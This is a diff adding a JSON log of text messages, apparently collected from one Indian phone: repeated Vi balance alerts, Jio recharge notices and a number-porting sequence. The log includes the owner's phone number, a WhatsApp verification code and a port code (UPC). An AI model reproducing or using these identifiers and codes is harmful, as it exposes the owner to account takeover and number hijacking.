+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:25.997Z"
+  },
+  {
+    "id": 496,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:23.758Z"
+  },
+  {
+    "id": 495,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:22.459Z"
+  },
+  {
+    "id": 494,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:21.223Z"
+  },
+  {
+    "id": 493,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:19.930Z"
+  },
+  {
+    "id": 492,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:18.674Z"
+  },
+  {
+    "id": 491,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:17.372Z"
+  },
+  {
+    "id": 490,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:15.936Z"
+  },
+  {
+    "id": 489,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:14.521Z"
+  },
+  {
+    "id": 488,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:12.887Z"
+  },
+  {
+    "id": 487,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:11.145Z"
+  },
+  {
+    "id": 486,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:09.851Z"
+  },
+  {
+    "id": 485,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:08.410Z"
+  },
+  {
+    "id": 484,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:07.117Z"
+  },
+  {
+    "id": 483,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:05.860Z"
+  },
+  {
+    "id": 482,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:04.240Z"
+  },
+  {
+    "id": 481,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:02.982Z"
+  },
+  {
+    "id": 480,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:01.679Z"
+  },
+  {
+    "id": 479,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:04:00.461Z"
+  },
+  {
+    "id": 478,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:58.973Z"
+  },
+  {
+    "id": 477,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:57.361Z"
+  },
+  {
+    "id": 476,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:56.075Z"
+  },
+  {
+    "id": 475,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:54.740Z"
+  },
+  {
+    "id": 474,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:53.533Z"
+  },
+  {
+    "id": 473,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:52.259Z"
+  },
+  {
+    "id": 472,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:50.984Z"
+  },
+  {
+    "id": 471,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:49.460Z"
+  },
+  {
+    "id": 470,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:48.285Z"
+  },
+  {
+    "id": 469,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:46.982Z"
+  },
+  {
+    "id": 468,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:45.366Z"
+  },
+  {
+    "id": 467,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:44.066Z"
+  },
+  {
+    "id": 466,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:42.674Z"
+  },
+  {
+    "id": 465,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:41.382Z"
+  },
+  {
+    "id": 464,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:39.764Z"
+  },
+  {
+    "id": 463,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:37.528Z"
+  },
+  {
+    "id": 462,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:36.264Z"
+  },
+  {
+    "id": 461,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:34.992Z"
+  },
+  {
+    "id": 460,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:33.516Z"
+  },
+  {
+    "id": 459,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:32.018Z"
+  },
+  {
+    "id": 458,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:30.867Z"
+  },
+  {
+    "id": 457,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:29.559Z"
+  },
+  {
+    "id": 456,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:28.250Z"
+  },
+  {
+    "id": 455,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:26.978Z"
+  },
+  {
+    "id": 454,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:25.550Z"
+  },
+  {
+    "id": 453,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:24.073Z"
+  },
+  {
+    "id": 452,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:22.661Z"
+  },
+  {
+    "id": 451,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:21.375Z"
+  },
+  {
+    "id": 450,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:19.941Z"
+  },
+  {
+    "id": 449,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:18.633Z"
+  },
+  {
+    "id": 448,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:17.372Z"
+  },
+  {
+    "id": 447,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:15.901Z"
+  },
+  {
+    "id": 446,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:14.678Z"
+  },
+  {
+    "id": 445,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:13.366Z"
+  },
+  {
+    "id": 444,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:12.099Z"
+  },
+  {
+    "id": 443,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:10.762Z"
+  },
+  {
+    "id": 442,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:08.741Z"
+  },
+  {
+    "id": 441,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:07.191Z"
+  },
+  {
+    "id": 440,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:05.170Z"
+  },
+  {
+    "id": 439,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:02.821Z"
+  },
+  {
+    "id": 438,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:01.536Z"
+  },
+  {
+    "id": 437,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:03:00.247Z"
+  },
+  {
+    "id": 436,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:58.973Z"
+  },
+  {
+    "id": 435,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:57.677Z"
+  },
+  {
+    "id": 434,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:56.382Z"
+  },
+  {
+    "id": 433,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:51.141Z"
+  },
+  {
+    "id": 432,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:48.988Z"
+  },
+  {
+    "id": 431,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:47.769Z"
+  },
+  {
+    "id": 430,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:46.483Z"
+  },
+  {
+    "id": 429,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:45.206Z"
+  },
+  {
+    "id": 428,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:43.946Z"
+  },
+  {
+    "id": 427,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:41.667Z"
+  },
+  {
+    "id": 426,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:40.227Z"
+  },
+  {
+    "id": 425,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:38.968Z"
+  },
+  {
+    "id": 424,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:37.588Z"
+  },
+  {
+    "id": 423,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:34.337Z"
+  },
+  {
+    "id": 422,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:31.726Z"
+  },
+  {
+    "id": 421,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:30.172Z"
+  },
+  {
+    "id": 420,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:28.911Z"
+  },
+  {
+    "id": 419,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:27.610Z"
+  },
+  {
+    "id": 418,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:25.392Z"
+  },
+  {
+    "id": 417,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:24.109Z"
+  },
+  {
+    "id": 416,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:22.856Z"
+  },
+  {
+    "id": 415,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:21.546Z"
+  },
+  {
+    "id": 414,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:20.191Z"
+  },
+  {
+    "id": 413,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:18.976Z"
+  },
+  {
+    "id": 412,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-ViCARE-S",
+    "message_body": "Charge:Rs 0.00; Main-Bal:Rs0.00, OG-Validity:26-Feb-26",
+    "received_at": "2026-02-01T07:02:16.578Z"
+  },
+  {
+    "id": 411,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VR-611123-P",
+    "message_body": "GOOD NEWS! You've SAVED Rs198 by using more than 9GB DATA with Vi Guarantee, at NO EXTRA COST. Track usage and validity at viapp.onelink.me/bSC3/ViG1",
+    "received_at": "2026-02-01T07:02:14.267Z"
+  },
+  {
+    "id": 409,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JR-JIOINF-S",
+    "message_body": "प्रिय Jio ग्राहक,\nहमें उम्मीद है कि आपने हाल ही में अनलिमिटेड JioTrue5G अनुभव का आनंद लिया होगा।\nआपके वर्तमान प्लान की वैधता जल्द ही समाप्त हो रही है। अनलिमिटेड Jio TRUE 5G अनुभव का उपयोग जारी रखने के लिए, सुनिश्चित करें कि आप 2 GB/दिन या उससे ऊपर के प्लान से रिचार्ज करें।\nअभी रिचार्ज करें - www.jio.com/r/TsKDjRypd \nJio की ओर से प्रेम भरी भेंट",
+    "received_at": "2026-01-25T12:53:23.830Z"
+  },
+  {
+    "id": 408,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JX-JioPay-S",
+    "message_body": "रिचार्ज सफल रहा!\nप्लान का नाम: 39.0 \nJio नंबर : 9783803992\nलाभ : \nBenefits: 1. Unlimited Data( 3GB/Day  4G/5G data thereafter unlimited at 64Kbps). Validity: 3 Days \nट्रांज़ैक्शन आईडी : 176934476967379442072 \nप्लान का विवरण देखें  - http://tiny.jio.com/dmyjioplans\nआप http://tiny.jio.com/dviewstatmnt पर क्लिक करके इस रिचार्ज के उपयोग का विवरण देख सकते हैं।\nअपने इस रिचार्ज अनुभव को हमारे साथ साझा करें - https://www.jio.com/selfcare/survey/?uid=686353e0-9c75-416f-8e90-712983f1d6e6&lang=hi&source=JIO.COM&custid=176934476967379442072",
+    "received_at": "2026-01-25T12:39:45.215Z"
+  },
+  {
+    "id": 407,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JA-JioPay-S",
+    "message_body": "Recharge Successful !\nPlan Name : 39.0\nJio Number : 9783803992\nEntitlement : \nBenefits: 1. Unlimited Data( 3GB/Day  4G/5G data thereafter unlimited at 64Kbps). Validity: 3 Days\nTransaction ID : 176934476967379442072\nView plan details - http://tiny.jio.com/dmyjioplans\nYou can check usage details for this recharge by clicking http://tiny.jio.com/dviewstatmnt\nShare your recent recharge experience with us - https://www.jio.com/selfcare/survey/?uid=686353e0-9c75-416f-8e90-712983f1d6e6&lang=en&source=JIO.COM&custid=176934476967379442072",
+    "received_at": "2026-01-25T12:39:43.341Z"
+  },
+  {
+    "id": 403,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp code: 383-532\nDon't share this code with others\n4sgLq1p5sV6",
+    "received_at": "2026-01-25T06:40:42.393Z"
+  },
+  {
+    "id": 401,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JD-620016-P",
+    "message_body": "आपके Jio नंबर 9783803992 का प्लान जल्दी ही समाप्त हो रहा है। Rs.349 से रिचार्ज कीजिए और अनलिमिटेड 5G डेटा, JioHotstar सब्सक्रिप्शन, अनलिमिटेड वॉयस कॉल और 28 दिनों के लिए  2 GB/दिन डेटा का आनंद लें। विशेष ऑफर 2 महीने का फ्री ट्रायल पाएं। नियम और शर्तें लागू। www.jio.com/r/CMGgVWfq7",
+    "received_at": "2026-01-25T06:09:24.915Z"
+  },
+  {
+    "id": 400,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JR-JIOINF-S",
+    "message_body": "Your plan for Jio number 9783803992 is expiring today. Recharge IMMEDIATELY to enjoy continued services.",
+    "received_at": "2026-01-25T05:31:03.195Z"
+  },
+  {
+    "id": 398,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "ViCare-S",
+    "message_body": " Waiting to welcome you at Vi. Your porting request JR565178 dated 25Jan26 has been approved by your current operator, it will be processed shortly. Please insert your Vi SIM in your handset once your current SIM displays no network.",
+    "received_at": "2026-01-25T03:24:50.260Z"
+  },
+  {
+    "id": 397,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "ViCare-S",
+    "message_body": " Waiting to welcome you at Vi. Your porting request JR565178 dated 25Jan26 has been approved by your current operator, it will be processed shortly. Please insert your Vi SIM in your handset once your current SIM displays no network.",
+    "received_at": "2026-01-25T03:24:49.856Z"
+  },
+  {
+    "id": 396,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JD-JIONET-S",
+    "message_body": "To cancel your port out request, please click http://tiny.jio.com/fXWljj . Thank you.",
+    "received_at": "2026-01-25T03:24:25.482Z"
+  },
+  {
+    "id": 395,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "1901",
+    "message_body": "Port request for 9783803992 is ACCEPTED and should be completed by 29-01-26 23:22.To CANCEL port, SMS CANCEL <space><mobile number> to 1900 till 26-01-26 08:54\".",
+    "received_at": "2026-01-25T03:24:23.655Z"
+  },
+  {
+    "id": 394,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "1901",
+    "message_body": "Port request is received for your mobile number 9783803992 from Reliance-Jio/Rajasthan to Vi/Rajasthan .",
+    "received_at": "2026-01-25T03:24:22.832Z"
+  },
+  {
+    "id": 391,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JZ-JIOSVC-S",
+    "message_body": "आप हमारे लिए महत्वपूर्ण हैं और आपकी संतुष्टि हमारी सर्वोच्च प्राथमिकता है। \nJio के साथ जुड़े रहें - भारत का सबसे बड़ा ट्रू 5G और 4G नेटवर्क जो सबसे किफायती दरों पर बेजोड़ कवरेज और गुणवत्ता प्रदान करता है। \nअपना पोर्टआउट अनुरोध रद्द करने के लिए, CANCEL <JIO NUMBER> टाइप करें और 1900 पर भेजें।",
+    "received_at": "2026-01-25T03:19:46.692Z"
+  },
+  {
+    "id": 390,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JX-JIOSVC-S",
+    "message_body": "You are important to us and your satisfaction is our highest priority. \nContinue with Jio - India's largest True 5G & 4G Network which provides unmatched coverage and quality at the most affordable rates. \nTo cancel your Portout request, type CANCEL <JIO NUMBER> and send to 1900.",
+    "received_at": "2026-01-25T03:19:46.096Z"
+  },
+  {
+    "id": 389,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "1901",
+    "message_body": "The UPC for your mobile no. 9783803992 is JR565178, valid upto 29-01-26 23:59. Do not share UPC with anyone except the recipient operator personnel.",
+    "received_at": "2026-01-25T03:19:23.974Z"
+  },
+  {
+    "id": 386,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JM-620040-P",
+    "message_body": "आपके पास JioHotstar है। Rs. 349 का रिचार्ज करके अपना सब्सक्रिप्शन एक्टिव रखें और 28 दिनों के लिए 2 GB/दिन डेटा पाएं। अपनों से जुड़े रहें, आनंद लेते रहें! रिचार्ज करने के लिए अभी यहाँ क्लिक करें. www.jio.com/r/CMA88GIc6",
+    "received_at": "2026-01-24T14:05:29.327Z"
+  },
+  {
+    "id": 385,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JR-JIOINF-S",
